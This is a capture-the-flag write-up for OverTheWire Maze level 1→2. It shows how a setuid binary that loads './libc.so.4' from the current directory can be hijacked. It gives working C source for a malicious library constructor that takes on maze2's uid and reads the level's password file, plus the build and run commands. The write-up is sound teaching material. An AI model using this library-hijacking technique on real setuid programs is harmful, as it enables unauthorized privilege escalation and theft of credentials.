# OverTheWire — Maze Level 1 → 2

> Goal: Get `maze2` password from `maze1`. Result: **`**********`** (hidden)
> Technique: **Shared library with a relative path** (`DT_NEEDED = ./libc.so.4`) → library
> injection from CWD (library hijacking).

---

## 1. Connection & First Look
```bash
ssh maze1@maze.labs.overthewire.org -p 2225
/maze/maze1
# error while loading shared libraries: ./libc.so.4: cannot open shared object file
```
The binary's `main` simply calls `puts("Hello World!")` — no logic to exploit. The hint is in
the error message.

## 2. Analysis (`readelf -d`)
```
0x01 (NEEDED)  Shared library: [./libc.so.4]   <-- RELATIVE PATH!
0x01 (NEEDED)  Shared library: [libc.so.6]
```
The binary links against a library named `./libc.so.4`. The leading `./` causes the dynamic
linker to look for it in the **current working directory (CWD)**. Since this is a setuid binary
(`-r-sr-x--- maze2 maze1`), any library code it loads runs with **maze2 privileges**.

## 3. Vulnerability
A setuid program loading a library from **a directory the attacker can write to** = direct code
execution. The library's `constructor` runs **before** `main`, at load time → we can do anything
we want as maze2.

> Note: on the first attempt I got `Permission denied`. The reason was not AT_SECURE — it was a
> **directory permission** issue: `mktemp -d` creates a 0700/maze1 directory, and the binary
> runs as euid maze2 so it can't enter that directory. Making the directory `711` and the `.so`
> `755` fixes it.

## 4. Exploit
Compile a malicious `./libc.so.4` with a constructor, run it from a writable directory:
```c
// fake.c
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))
static void go(void){
    setresuid(geteuid(),geteuid(),geteuid());   // lock ruid=euid=maze2
    system("id; cat /etc/maze_pass/maze2");
    _exit(0);
}
```
```bash
D=/tmp/work; mkdir -p $D; chmod 711 $D; cd $D
gcc -m32 -shared -fPIC -o libc.so.4 fake.c
chmod 755 libc.so.4
/maze/maze1            # fake libc.so.4 from CWD is loaded → constructor runs as maze2
# uid=15002(maze2) ... <maze2 password>
```
The real `libc.so.6` is the second NEEDED, so `system`/`setresuid` resolve without issue.
`puts`/`__libc_start_main` are lazy-bound and we `_exit` before reaching `main`, so the fake
library doesn't need to provide them.

## Lessons
| Topic | Note |
|-------|------|
| Relative `DT_NEEDED` | `./lib...` or RPATH `$ORIGIN`/`.` → loads from CWD; fatal in setuid binaries |
| Library hijacking | Writable directory + setuid loader = code as maze2 |
| `constructor` | `__attribute__((constructor))` runs before `main`, at load time |
| Permission trap | The setuid victim enters the target directory as **euid**; directory must be `o+x` (`711`), file `o+r` |
| Why not LD_PRELOAD | Setuid binaries apply AT_SECURE → `LD_PRELOAD`/`LD_LIBRARY_PATH` are ignored; but **embedded** relative paths in the binary still apply |
